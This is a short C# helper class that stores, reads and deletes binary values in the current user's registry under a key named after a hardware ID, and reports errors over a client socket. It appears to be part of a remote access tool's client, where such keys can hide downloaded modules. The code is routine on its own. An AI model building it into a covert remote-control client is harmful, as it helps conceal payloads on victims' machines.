using Microsoft.Win32;
using Client.Connection;
using System;

namespace Client.Helper
{
    public static class SetRegistry
    {
        private static readonly string ID = @"Software\" + Settings.Hw_id;

        public static bool SetValue(string name, byte[] value)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(ID, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    key.SetValue(name, value, RegistryValueKind.Binary);
                    return true;
                }
            }
            catch (Exception ex)
            {
                ClientSocket.Error(ex.Message);
            }
            return false;
        }

        public static byte[] GetValue(string value)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(ID))
                {
                    object o = key.GetValue(value);
                    return (byte[])o;
                }
            }
            catch (Exception ex)
            {
                ClientSocket.Error(ex.Message);
            }
            return null;
        }

        public static bool DeleteValue(string name)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(ID))
                {
                    key.DeleteValue(name);
                    return true;
                }
            }
            catch (Exception ex)
            {
                ClientSocket.Error(ex.Message);
            }
            return false;
        }

        public static bool DeleteSubKey()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("", true))
                {
                    key.DeleteSubKeyTree(ID);
                    return true;
                }
            }
            catch (Exception ex)
            {
                ClientSocket.Error(ex.Message);
            }
            return false;
        }
    }
}
